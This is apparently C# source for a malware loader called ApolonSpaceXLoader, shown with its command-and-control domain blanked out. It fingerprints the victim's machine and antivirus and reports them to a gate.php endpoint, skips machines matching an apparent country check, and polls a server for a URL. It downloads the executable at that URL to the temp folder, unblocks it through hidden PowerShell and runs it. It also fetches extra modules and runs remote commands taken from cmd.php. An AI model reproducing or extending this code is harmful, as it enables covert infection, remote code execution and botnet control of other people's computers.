using System;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace ApolonSpaceXLoader
{
    class Program
    {
        private static readonly string LogFilePath = Path.Combine(Path.GetTempPath(), "");
        public static readonly string dom = Encoding.UTF8.GetString(Convert.FromBase64String("-"));
        public static string Gate = $"{dom}/gate.php?hwid={Helper.HWID()}&os={Helper.GetOSInformation()}&av={Helper.AV()}";
        public static string urlPage = $"{dom}/loader.txt";
        public static string oldCommand { get; set; } = "";

        [MTAThread]
        static void Main(string[] args)
        {
           using (WebClient wc = new WebClient())
           {
           string gateResponse = wc.DownloadString(Gate);
           }
            if (Helper.Cis(dom))
            {
                Environment.Exit(1);
            }
            MyRegistry.Check();

            Task.Run(() =>
            {
                while (true)
                {
                    Work();
                    Thread.Sleep(5000);
                }
            });

            Task.Run(() =>
            {
                MyModules.NewSession();
                while (true)
                {
                    if (MyModules.CheckNewModules())
                    {
                        MyModules.DownloadModules();
                    }
                    Thread.Sleep(5000);
                }
            });

            Task.Run(() =>
            {
                while (true)
                {
                    try
                    {
                        using (WebClient wc = new WebClient())
                        {
                            string rawCommand = wc.DownloadString(dom + "/cmd.php");

                            string newCommand = ExtractCommand(rawCommand);

                            string lastCommand = null;
                            try
                            {
                                lastCommand = MyRegistry.GetLastCommand();
                            }
                            catch (Exception ex)
                            {
                                lastCommand = "";
                            }

                            if (!string.IsNullOrEmpty(newCommand) &&
                                newCommand != (oldCommand ?? "") &&
                                newCommand != (lastCommand ?? ""))
                            {
                                bool success = SConsole.CVoid(newCommand);
                                if (success)
                                {
                                    try
                                    {
                                        MyRegistry.UpdateCommand(newCommand);
                                        oldCommand = newCommand;
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                                else
                                {
                                }
                            }
                            else
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }

                    Thread.Sleep(5000);
                }
            });

            Thread.Sleep(Timeout.Infinite);
        }

        private static string ExtractCommand(string rawCommand)
        {
            try
            {
                if (string.IsNullOrEmpty(rawCommand))
                {
                    return "";
                }

                Match match = Regex.Match(rawCommand, @"<\/html>(.*)", RegexOptions.Singleline);
                if (match.Success)
                {
                    return match.Groups[1].Value.Trim();
                }

                return rawCommand.Trim();
            }
            catch (Exception ex)
            {
                return "";
            }
        }

        private static void Work()
        {
            try
            {
                string rnd = Helper.RandomID(6);
                string dropPath = $"{Path.GetTempPath()}{rnd}.exe";

                string urlOnPage;
                using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
                {
                    urlOnPage = strr.ReadToEnd().Trim();
                }

                if (string.IsNullOrWhiteSpace(urlOnPage))
                {
                    return;
                }

                if (MyRegistry.GetURL() != urlOnPage)
                {
                    if (File.Exists(dropPath))
                    {
                        File.Delete(dropPath);
                    }

                    MyRegistry.SetURL(urlOnPage);

                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    using (WebClient wc = new WebClient())
                    {
                        wc.DownloadFile(new Uri(urlOnPage), dropPath);
                    }

                    try
                    {
                        File.SetAttributes(dropPath, FileAttributes.Normal);
                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                            FileName = "powershell.exe",
                            Arguments = $"-Command Unblock-File -Path \"{dropPath}\"",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        };
                        Process unblockProcess = Process.Start(psi);
                        unblockProcess?.WaitForExit();
                    }
                    catch (Exception ex)
                    {
                    }

                    try
                    {
                        byte[] header = new byte[2];
                        using (FileStream fs = File.OpenRead(dropPath))
                        {
                            fs.Read(header, 0, 2);
                        }
                        if (header[0] != 0x4D || header[1] != 0x5A)
                        {
                            return;
                        }
                    }
                    catch (Exception ex)
                    {
                        return;
                    }

                    try
                    {
                        Type shellType = Type.GetTypeFromProgID("Shell.Application");
                        dynamic shell = Activator.CreateInstance(shellType);
                        shell.ShellExecute(dropPath, "", "", "open", 1);
                        Marshal.ReleaseComObject(shell);
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            Process.Start(new ProcessStartInfo
                            {
                                FileName = dropPath,
                                UseShellExecute = true
                            });
                        }
                        catch (Exception ex2)
                        {
                        }
                    }
                }
                else
                {
                }
            }
            catch (Exception ex)
            {
            }
        }
    }
}